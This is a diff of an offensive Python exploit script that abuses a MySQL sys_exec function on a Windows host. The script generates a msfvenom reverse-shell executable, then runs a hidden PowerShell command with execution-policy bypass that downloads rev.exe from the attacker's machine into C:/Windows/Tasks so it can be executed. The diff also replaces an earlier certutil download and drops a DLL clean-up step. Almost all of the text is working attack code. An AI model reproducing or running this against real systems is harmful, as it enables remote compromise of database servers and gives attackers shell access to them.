@@ -20,7 +20,6 @@ args = parser.parse_args()
 
 
 mydb = mysql.connector.connect(
-    # host="192.168.1.110",
     host = args.RHOST,
     user = args.user,
     password = args.password
@@ -64,15 +63,8 @@ print(f"[*] Function successfully created. Generating msfvenom payload...")
 # Generate reverse shell payload:
 os.system(f'msfvenom -p windows/{args.architecture}/shell_reverse_tcp LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f exe > rev.exe')
 
-# sql = f"select sys_exec('certutil -urlcache -split -f http://{args.lhost}/rev.exe')"
-# print(f"[*] Attempting to run: {sql[17:-2]}")
-# cursor.execute(sql)
-
+print(f"[*] Attempting to download reverse shell.")
 sql = f"select sys_exec('powershell -ep bypass -windowstyle hidden IEX(New-Object System.Net.WebClient).DownloadFile(\"http://{args.lhost}/rev.exe\", \"C:/Windows/Tasks/rev.exe\")')"
-cursor.execute(sql)
-
-# Attempt to clean up dll
-sql = f"select sys_exec('del /f /q {dllName}.dll')"
 cursor.execute(sql)
 
 print(f"[*] Payload uploaded. Attempting to execute...")
